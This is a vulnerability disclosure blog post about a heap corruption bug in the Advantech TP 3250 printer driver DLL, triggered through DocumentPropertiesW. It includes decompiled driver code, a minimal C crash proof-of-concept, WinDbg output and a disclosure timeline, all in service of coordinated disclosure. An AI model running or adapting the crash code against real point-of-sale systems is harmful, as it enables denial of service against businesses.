---
layout: post
category: Security
title: "Heap Corruption in Advantech TP 3250 Printer Driver (DrvUI_x64_ADVANTECH.dll) via DocumentPropertiesW"
heading: "Heap Corruption in Advantech TP 3250 Printer Driver (DrvUI_x64_ADVANTECH.dll) via DocumentPropertiesW"
description: Mismatched input output buffers to DocumentPropertiesW trigger a bug in the Advantech TP 3250 usermode driver module, crashing with 0xc0000374 (heap corruption)
---

> **Note:** This post is currently under review. Last updated: 2025-10-08

## TLDR:

- There is a bug in the DrvUI_x64_ADVANTECH.dll when DocumentPropertiesW() is
  called with a valid dmDriverExtra but an undersized output buffer.
- I was only able to cause a crash, but I think you could move it to a
  code execution, but that would only be in the user space and not kernel.
- Minimal crash PoC can be found in the appendix.
- Affected dll: DrvUI_x64_ADVANTECH.dll (v0.3.9200.20789).
- Driver can be found here:
  https://www.advantech.com/emt/support/details/driver?id=1-2LFJBRQ


## Background:

Recently while doing some reading on security news, I had reaslised that I had
never really done any research into any windows drivers. I also noticed that
almost every shop that I go into has a receipt printer! So I thought this would
be an amazing target, as I had also noticed that 99% of the POS terminals I
have seen also run windows (an outdated one at that).  Choosing Advantech was
just the first brand of printer I saw at my local takeaway. This was also my
first forray into learning ghidra in any real detail, and it was a lot of fun!


## Test env:

- Virtual box running Microsoft Windows 10 build 19041 x64
- Clean VM with only Windgb, Vbox additions, and the driver installed.
- A remote path to my host machine to move exes and other files around.


## Repro:

1: Compile the `crash_min.c` file in the appendix eg: `x86_64-w64-mingw32-gcc
   crash_min.c -o crash_min.exe -lwinspool`

2: Enable crash dumps on the Windows system. Run the following commands in Admin Powershell:
```
New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps" -Force | Out-Null
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps" `
  -Name "DumpFolder" -Value "C:\Dumps" -PropertyType ExpandString -Force | Out-Null
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps" `
  -Name "DumpType"  -Value 2 -PropertyType DWord -Force | Out-Null   # 2 = Full dump
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps" `
  -Name "DumpCount" -Value 10 -PropertyType DWord -Force | Out-Null

```
3: Install the driver from the above link (in TLDR)

4: Run the compiled code, and view the `crash_min.exe.2896` file in the `C:\Dumps\` dir
This should match the crash output in the appendix :)

### The Bug

The bug lies in the drivers assumption that the output buffer that has been
given to it is as big as the buffer given as the input. However since both of
these are user controlled you can make that not so. With an undersized output
buffer you can force the down stream logic to perform an invalid free on the
heap memory that it thinks it owns.

#### What this looks like it Ghidra

First things first, since I was looking at memory level issues, I did the basic search for `malloc`, `memcpy`, `new` and `free`.

`memcpy` seemed to show the most interesting things, these are the functions that looked interesting to me, and are the root of this bug:

But first here is a simplified call graph:
`DocumentPropertiesW → DrvDocumentPropertySheets → FUN_180027d30 → FUN_180027c0c → memcpy(…) → heap corruption`

For reference here are the offsets that are used in the functions:
```
DrvDocumentPropertySheets(param_1, param_2) →
param_2+0x18 = pdmIn,
param_2+0x20 = pdmOut,
param_2+0x2C = fMode,
param_2+0x28 = cbNeeded.
```

```
FUN_180027d30(pIn, pIn2, pOut)
```
If `pIn2 == NULL: memcpy(pOut, pIn, pIn->dmSize + pIn->dmDriverExtra)` - This will might be another bug...

If `pIn2 != NULL` (PoC path):

Sets `pOut->dmSize = min(pIn->dmSize, pIn2->dmSize)`

Sets `pOut->dmDriverExtra = min(pIn->dmDriverExtra, pIn2->dmDriverExtra)`

Calls `FUN_180027c0c(pIn, pOut)` to perform the actual header+tail copies.


```
FUN_180027c0c(pIn, pOut)
```
Copies Header bytes: `hdr = min(pIn->dmSize, pOut->dmSize)`
`memcpy(pOut, pIn, hdr)`

Copies tail or extra bytes: `tail = min(pIn->dmDriverExtra, pOut->dmDriverExtra)`
`memcpy((BYTE*)pOut + pOut->dmSize, (BYTE*)pIn + pIn->dmSize, tail)`

By design this should write a total of `hdr + tail bytes` However if `pOut` is less that `written` we will get our bug.

#### Full functions

```c
int DrvDocumentPropertySheets(longlong param_1,longlong param_2)

{
  uint uVar1;
  longlong lVar2;
  int iVar3;
  HANDLE *ppvVar4;
  int iVar5;
  iVar5 = -1;
                    /* 0x12a50  261  DrvDocumentPropertySheets */
  iVar3 = -1;
  if (param_1 == 0) {
    if (param_2 != 0) {
      uVar1 = *(uint *)(param_2 + 0x2c);
      if ((uVar1 == 0) || (*(longlong *)(param_2 + 0x20) == 0)) {
        iVar3 = 0x1250;
        *(undefined4 *)(param_2 + 0x28) = 0x1250;
      }
      else if (((uVar1 & 3) == 0) || ((uVar1 & 0x20) != 0)) {
        iVar3 = 1;
      }
      else {
        ppvVar4 = FUN_180012d88(*(HANDLE *)(param_2 + 8),*(void **)(param_2 + 0x18),0,0);
        if (ppvVar4 != (HANDLE *)0x0) {
          FUN_180027d30((void *)((longlong)ppvVar4 + 0x3c),*(longlong *)(param_2 + 0x18),
                        *(void **)(param_2 + 0x20));
          iVar3 = 1;
          FUN_180012f3c(ppvVar4);
        }
      }
    }
  }
  ...

```

```c
bool FUN_180027d30(void *param_1,longlong param_2,void *param_3)

{
  undefined2 uVar1;
  int iVar2;
  if (param_2 == 0) {
    ...
  }
  else if ((param_1 != (void *)0x0) && (param_3 != (void *)0x0)) {
    if (*(ushort *)(param_2 + 0x44) < *(ushort *)((longlong)param_1 + 0x44)) {
      *(undefined2 *)((longlong)param_3 + 0x40) = *(undefined2 *)(param_2 + 0x40);
      uVar1 = *(undefined2 *)(param_2 + 0x44);
    }
    else {
      *(undefined2 *)((longlong)param_3 + 0x40) = *(undefined2 *)((longlong)param_1 + 0x40);
      uVar1 = *(undefined2 *)((longlong)param_1 + 0x44);
    }
    *(undefined2 *)((longlong)param_3 + 0x44) = uVar1;
    if (*(ushort *)(param_2 + 0x46) < *(ushort *)((longlong)param_1 + 0x46)) {
      *(undefined2 *)((longlong)param_3 + 0x42) = *(undefined2 *)(param_2 + 0x42);
      *(undefined2 *)((longlong)param_3 + 0x46) = *(undefined2 *)(param_2 + 0x46);
    }
    else {
      *(undefined2 *)((longlong)param_3 + 0x42) = *(undefined2 *)((longlong)param_1 + 0x42);
      *(undefined2 *)((longlong)param_3 + 0x46) = *(undefined2 *)((longlong)param_1 + 0x46);
    }
    iVar2 = FUN_180027c0c(param_1,param_3);
    return 0 < iVar2;
  }
  return false;
}
```

```c

int FUN_180027c0c(void *param_1,void *param_2)

{
  ushort uVar1;
  undefined2 uVar2;
  ushort uVar3;
  ushort uVar4;
  ushort uVar5;
  short sVar6;
  short sVar7;
  uint uVar8;
  int iVar9;

  if (param_2 == (void *)0x0) {
LAB_180027d06:
    iVar9 = -1;
  }
  else {
    uVar8 = (uint)*(ushort *)((longlong)param_1 + 0x44);
    sVar7 = 800;
    if (uVar8 == 0xbc) {
      ...
    }
    else {
      if (uVar1 != 0xdc) {
        sVar7 = *(short *)((longlong)param_2 + 0x40);
        goto LAB_180027c88;
      }
      sVar7 = 0x401;
    }
    uVar2 = *(undefined2 *)((longlong)param_2 + 0x42);
    uVar3 = *(ushort *)((longlong)param_2 + 0x46);
    if (uVar1 < *(ushort *)((longlong)param_1 + 0x44)) {
      uVar8 = (uint)uVar1;
    }
    memcpy(param_2,param_1,(longlong)(int)uVar8);
    *(short *)((longlong)param_2 + 0x40) = sVar7;
    *(undefined2 *)((longlong)param_2 + 0x42) = uVar2;
    *(ushort *)((longlong)param_2 + 0x44) = uVar1;
    *(ushort *)((longlong)param_2 + 0x46) = uVar3;
    uVar4 = *(ushort *)((longlong)param_1 + 0x46);
    uVar5 = uVar3;
    if (uVar4 <= uVar3) {
      uVar5 = uVar4;
    }
    iVar9 = uVar8 + uVar5;
    if (uVar3 < uVar4) {
      uVar4 = uVar3;
    }
    memcpy((void *)((longlong)param_2 + (ulonglong)uVar1),
           (void *)((ulonglong)*(ushort *)((longlong)param_1 + 0x44) + (longlong)param_1),
           (longlong)(int)(uint)uVar4);
  }
  return iVar9;
}

```


Now the main issue here is that final memcpy, it is assuming that the output
(`(void *)((longlong)param_2 + (ulonglong)uVar1)`) has been allocated with at
least the required amout of memory.


### Impact:

- This is ONLY in user space so there is no risk of Kernel comprimise here, this is a user-mode DLL not a kernel mode.
- Due to the above I dont think its possible for privilege escalation.
- This can cause a dos attack on any process that is trying to invoke the `DocumentPropertiesW`
- Since this is a heap corruption error in usermode then I think someone smarter than me would be able to move this into code execution.


## Timeline:

- Tue, Jul 29 2025: Bug discovered and reported to NCSC
- Fri, Aug 1 2025: Response from NCSC
- Wed, Aug 13 2025: NCSC reported bug to vendor
- Mon, Oct 6 2025: NCSC informed me that the disclosure period has ended and I am free to post about this.


## Appendix:

### A - POC

Note that this is just to show the crash, and this is not publishing any real exploit.

```c
#include <windows.h>
#include <winspool.h>
#include <stdio.h>

int main() {
    HANDLE hPrinter;
    WCHAR printerName[] = L"TP 3250"; // Is this always the same for all printers?? doesnt feel right ..

    if (!OpenPrinterW(printerName, &hPrinter, NULL)) {
        printf("OpenPrinterW failed: %lu\n", GetLastError());
        return 1;
    }

    printf("OpenPrinterW successful: handle = %p\n", hPrinter);

    DWORD extra = 0x740;
    DWORD outBufSize = 320;
    BYTE inputBuf[0x800] = {0};
    PDEVMODEW pIn = (PDEVMODEW)inputBuf;
    wcscpy(pIn->dmDeviceName, printerName);
    pIn->dmSize = sizeof(DEVMODEW);
    pIn->dmDriverExtra = extra;

    BYTE *outBuf = (BYTE*)malloc(outBufSize);
    if (!outBuf) {
        printf("wtf failed to allocate output buffer\n");
        ClosePrinter(hPrinter);
        return 1;
    }
    memset(outBuf, 0xCC, outBufSize);

    printf("calling DocumentPropertiesW() with dmDriverExtra = 0x%lx, outBuf = %lu bytes\n", extra, outBufSize);
    LONG r = DocumentPropertiesW(NULL, hPrinter, printerName, (PDEVMODEW)outBuf, pIn, DM_OUT_BUFFER | DM_IN_BUFFER);

    if (r == IDOK) {
        printf("DocumentPropertiesW returned: %ld\n", r);
    } else {
        printf("DocumentPropertiesW failed with:  %lu\n", GetLastError());
    }

    free(outBuf);
    ClosePrinter(hPrinter);
    return 0;
}
```

### B - WinDbg output

```
0:000> !analyze -v
.........................
*******************************************************************************
*                                                                             *
*                        Exception Analysis                                   *
*                                                                             *
*******************************************************************************

*** WARNING: Check Image - Checksum mismatch - Dump: 0x1f3b32, File: 0x1fd444 - C:\ProgramData\Dbg\sym\ntdll.dll\D1CD38081F8000\ntdll.dll
Unable to load image \\VBOXSVR\advantech\crash_min.exe, Win32 error 0n2

KEY_VALUES_STRING: 1

    Key  : Analysis.CPU.mSec
    Value: 1015

    Key  : Analysis.Elapsed.mSec
    Value: 32828

    Key  : Analysis.IO.Other.Mb
    Value: 0

    Key  : Analysis.IO.Read.Mb
    Value: 1

    Key  : Analysis.IO.Write.Mb
    Value: 0

    Key  : Analysis.Init.CPU.mSec
    Value: 781

    Key  : Analysis.Init.Elapsed.mSec
    Value: 45351

    Key  : Analysis.Memory.CommitPeak.Mb
    Value: 83

    Key  : Analysis.Version.DbgEng
    Value: 10.0.27871.1001

    Key  : Analysis.Version.Description
    Value: 10.2505.01.02 amd64fre

    Key  : Analysis.Version.Ext
    Value: 1.2505.1.2

    Key  : Failure.Bucket
    Value: HEAP_CORRUPTION_ACTIONABLE_ListEntryCorruption_c0000374_DrvUI_x64_ADVANTECH.dll!Unknown

    Key  : Failure.Exception.Code
    Value: 0xc0000374

    Key  : Failure.Exception.IP.Address
    Value: 0x7ffc995ef3c9

    Key  : Failure.Exception.IP.Module
    Value: ntdll

    Key  : Failure.Exception.IP.Offset
    Value: 0xff3c9

    Key  : Failure.Hash
    Value: {f73b6e40-eff5-e543-d66a-d70b778facc2}

    Key  : Failure.ProblemClass.Primary
    Value: HEAP_CORRUPTION

    Key  : Timeline.OS.Boot.DeltaSec
    Value: 1252

    Key  : Timeline.Process.Start.DeltaSec
    Value: 8

    Key  : WER.OS.Branch
    Value: vb_release

    Key  : WER.OS.Version
    Value: 10.0.19041.1


FILE_IN_CAB:  crash_min.exe.2896.dmp

NTGLOBALFLAG:  40000400

APPLICATION_VERIFIER_FLAGS:  0

CONTEXT:  (.ecxr)
rax=0000000000000000 rbx=00000000c0000374 rcx=0000000000000000
rdx=0000000000000000 rsi=0000000000000001 rdi=00007ffc996597f0
rip=00007ffc995ef3c9 rsp=00000012c47fe880 rbp=0000000000000000
 r8=0000000000000000  r9=0000000000000000 r10=0000000000000000
r11=0000000000000000 r12=0000017919ed0150 r13=0000000000000000
r14=0000017919ed5c10 r15=0000017919ed1820
iopl=0         nv up ei pl nz na pe nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
ntdll!RtlReportFatalFailure+0x9:
00007ffc`995ef3c9 eb00            jmp     ntdll!RtlReportFatalFailure+0xb (00007ffc`995ef3cb)
Resetting default scope

EXCEPTION_RECORD:  (.exr -1)
ExceptionAddress: 00007ffc995ef3c9 (ntdll!RtlReportFatalFailure+0x0000000000000009)
   ExceptionCode: c0000374
  ExceptionFlags: 00000001
NumberParameters: 1
   Parameter[0]: 00007ffc996597f0

PROCESS_NAME:  crash_min.exe

ERROR_CODE: (NTSTATUS) 0xc0000374 - A heap has been corrupted.

EXCEPTION_CODE_STR:  c0000374

EXCEPTION_PARAMETER1:  00007ffc996597f0

STACK_TEXT:
00000012`c47fe880 00007ffc`995ef393     : 00007ffc`99636e80 00000012`c47ff830 00000000`00000000 00000000`00000000 : ntdll!RtlReportFatalFailure+0x9
00000012`c47fe8d0 00007ffc`995f8112     : 00000000`00000000 00007ffc`996597f0 00000000`0000000d 00000179`19ed0000 : ntdll!RtlReportCriticalFailure+0x97
00000012`c47fe9c0 00007ffc`995f83fa     : 00000000`0000000d 00000000`00000000 00000179`19ed0000 00000000`00000000 : ntdll!RtlpHeapHandleError+0x12
00000012`c47fe9f0 00007ffc`995fe081     : 00000179`19ed0000 00000179`19ed5af0 00000000`00000000 00000000`00000000 : ntdll!RtlpHpHeapHandleError+0x7a
00000012`c47fea20 00007ffc`99516625     : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : ntdll!RtlpLogHeapFailure+0x45
00000012`c47fea50 00007ffc`99515b74     : 00000179`19ed0000 00000179`19ed0000 00000179`19ed5af0 00000179`19ed0000 : ntdll!RtlpFreeHeap+0xa25
00000012`c47fec00 00007ffc`995147b1     : 00000012`c47fef10 00000179`19ed0000 00000000`00000000 00000000`00000000 : ntdll!RtlpFreeHeapInternal+0x464
00000012`c47fecc0 00007ffc`992e9c9c     : 00000179`19ed6140 00000179`19ed6140 00000179`19c05e20 00000000`00000000 : ntdll!RtlFreeHeap+0x51
00000012`c47fed00 00007ffc`58ce2f5c     : 00000000`00000000 00000000`00000000 00000179`19ed6140 00000012`c47fee20 : msvcrt!free+0x1c
00000012`c47fed30 00007ffc`58ce2b62     : 00000000`00000001 00000000`00000000 00007ffc`58cd0000 00000012`c47fee20 : DrvUI_x64_ADVANTECH!DevQueryPrintEx+0x1e0
00000012`c47fed60 00007ffc`60718a76     : ffffffff`ffffffff 00000000`00000000 00007ffc`58cd0000 00000000`00000000 : DrvUI_x64_ADVANTECH!DrvDocumentPropertySheets+0x112
00000012`c47feda0 00007ffc`6071732a     : 00000000`0000000a 00000000`0000000a 00000012`c47fee50 00000012`c47fef10 : winspool!DocumentPropertySheets+0xc6
00000012`c47fedf0 00007ffc`60716b3f     : 00000000`0000000a 00000179`19c05e20 00000000`0000081c 00000012`c47fef10 : winspool!DocumentPropertiesWNative+0xce
00000012`c47fee80 00007ff7`911c1692     : 00000000`00000008 00000012`c47fef60 00000000`00000022 00000012`c47ff710 : winspool!DocumentPropertiesW+0x8f
00000012`c47feee0 00007ff7`911c1307     : 00000000`00000000 00000000`00000022 00007ff7`911cc048 00000000`00000000 : crash_min+0x1692
00000012`c47ff770 00007ff7`911c142a     : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : crash_min+0x1307
00000012`c47ff7d0 00007ffc`97ab7374     : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : crash_min+0x142a
00000012`c47ff800 00007ffc`9953cc91     : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : kernel32!BaseThreadInitThunk+0x14
00000012`c47ff830 00000000`00000000     : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : ntdll!RtlUserThreadStart+0x21


STACK_COMMAND: ~0s; .ecxr ; kb

SYMBOL_NAME:  DrvUI_x64_ADVANTECH+12f5c

MODULE_NAME: DrvUI_x64_ADVANTECH

IMAGE_NAME:  DrvUI_x64_ADVANTECH.dll

BUCKET_ID_MODPRIVATE: 1

FAILURE_BUCKET_ID:  HEAP_CORRUPTION_ACTIONABLE_ListEntryCorruption_c0000374_DrvUI_x64_ADVANTECH.dll!Unknown

OS_VERSION:  10.0.19041.1

BUILDLAB_STR:  vb_release

OSPLATFORM_TYPE:  x64

OSNAME:  Windows 10

IMAGE_VERSION:  0.3.9200.20789

FAILURE_ID_HASH:  {f73b6e40-eff5-e543-d66a-d70b778facc2}

Followup:     MachineOwner
```
